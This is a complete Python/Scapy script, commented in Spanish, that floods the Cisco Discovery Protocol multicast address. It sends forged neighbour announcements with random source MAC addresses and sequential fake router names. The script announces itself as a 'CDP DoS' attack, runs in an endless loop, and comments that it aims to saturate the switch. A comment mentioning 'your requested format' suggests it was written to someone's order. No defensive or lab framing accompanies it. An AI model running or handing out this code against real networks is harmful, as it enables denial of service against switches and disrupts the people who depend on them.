from scapy.all import Ether, LLC, SNAP, Raw, sendp, RandMAC
import struct
import random
import time

# Configuración
CDP_MULTICAST = "01:00:0c:cc:cc:cc"
INTERFACE = "eth0"

def generar_checksum(data):
    if len(data) % 2 != 0:
        data += b'\x00'
    s = 0
    for i in range(0, len(data), 2):
        s += (data[i] << 8) + data[i+1]
    s = (s >> 16) + (s & 0xffff)
    s += (s >> 16)
    return (~s) & 0xffff

def tlv(tipo, valor):
    return struct.pack("!HH", tipo, len(valor) + 4) + valor

def crear_cdp_raw(id_numero):
    # Usamos tu formato solicitado: R1_FAKE, R2_FAKE...
    device_id = f"R{id_numero}_FAKE".encode()
    port_id = b"Ethernet0/0"
    capabilities = struct.pack("!I", 0x01) # Router
    platform = b"Cisco 7200"

    # Construcción de TLVs
    payload = b""
    payload += tlv(0x0001, device_id)
    payload += tlv(0x0003, port_id)
    payload += tlv(0x0004, capabilities)
    payload += tlv(0x0006, platform)

    header_sin_chksm = struct.pack("!BBH", 0x02, 180, 0x0000)
    checksum = generar_checksum(header_sin_chksm + payload)
    
    return struct.pack("!BBH", 0x02, 180, checksum) + payload

print(f"[*] Iniciando ataque CDP DoS en {INTERFACE}")
print("[*] Generando vecinos secuenciales: R1_FAKE, R2_FAKE...")

contador = 1
try:
    while True:
        packet = (
            Ether(src=RandMAC(), dst=CDP_MULTICAST) /
            LLC(dsap=0xaa, ssap=0xaa, ctrl=3) /
            SNAP(OUI=0x00000c, code=0x2000) /
            Raw(load=crear_cdp_raw(contador))
        )
        
        sendp(packet, iface=INTERFACE, verbose=False)
        
        if contador % 20 == 0:
            print(f"[+] {contador} vecinos falsos inyectados...")
            
        contador += 1
        time.sleep(0.05) # Pequeña pausa para no saturar tu CPU, solo el switch

except KeyboardInterrupt:
    print(f"\n[!] Ataque detenido. Total de vecinos: {contador}")
